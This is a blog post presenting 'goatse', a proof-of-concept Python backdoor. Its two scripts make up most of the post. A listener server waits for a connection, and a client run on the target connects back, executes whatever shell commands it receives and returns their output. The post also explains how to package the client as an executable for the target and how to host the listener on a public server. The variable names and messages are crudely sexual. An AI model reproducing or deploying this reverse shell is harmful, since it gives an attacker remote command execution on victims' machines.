---
layout: post
title:  "Proof of Concept Python Backdoor"
date:   2020-09-11 6:00:00 +0800
categories: coding
---

# goatse
a proof of concept backdoor for the most bare-bone access

## Usage
Run the server.py on your computer to start listening for callbacks.
```bash
$ sudo chmod 775 server.py
$ ./server.py
```

3 ways you can start goatse to target computer
1. run as python script
```bash
$ sudo chmod 775 goatse.py
$ ./goatse.py
```
2. create an exe file using pyinstaller, exe file is located in dist folder
```
$ pyinstaller --onefile goatse.py
```

## How does it work?
server.py
```
#!/usr/bin/env python3

#import socket API module
import socket

# for LAN you can use your pc's ip.
# for WAN you need to setup your own server in aws or digital ocean get the IP of said server and you can just ssh to that machine and run this script. other option is to use your own ISP public ip address and port forward to your pc's ip address.
serverIp = '192.168.1.1'
serverPort = 8080 
server = socket.socket()
server.bind((serverIp, serverPort))
print('Server is online')
print('Listening for callback')

#listening for callback
server.listen(1)
target, target_addr = server.accept()

#will display once callback is initiated
print(f'[+] {target_addr} She spreads the legs, it is time')


```
goatse.py
```
#!/usr/bin/env python3

#import socket and subprocess modules, subprocess module allows us to run commands on our target machine.
import subprocess
import socket


#don't forget to set the correct server ip address and port in order for this to callback home.
serverIp = '192.168.1.1'
serverPort = 8080
backdoor = socket.socket()
backdoor.connect((serverIp, serverPort))

while True:
    #after successfull callback to home, goatse will start to listen for commands from server
    anal = backdoor.recv(1024)
    
    #this decodes the user command from sent from server
    anal = anal.decode()
    UserInput = subprocess.Popen(anal, shell = True, stderr = subprocess.PIPE, stdout = subprocess.PIPE)
    
    #then executes command and read the output/error
    output = UserInput.stdout.read()
    output_error = UserInput.stderr.read()
    backdoor.send(output + output_error)
```

## License
[BSD 3-Clause “New” or “Revised” License](https://choosealicense.com/licenses/bsd-3-clause/)

### Resources:
[Github Repo](https://github.com/AdrianDucao/goatse)

Happy Coding.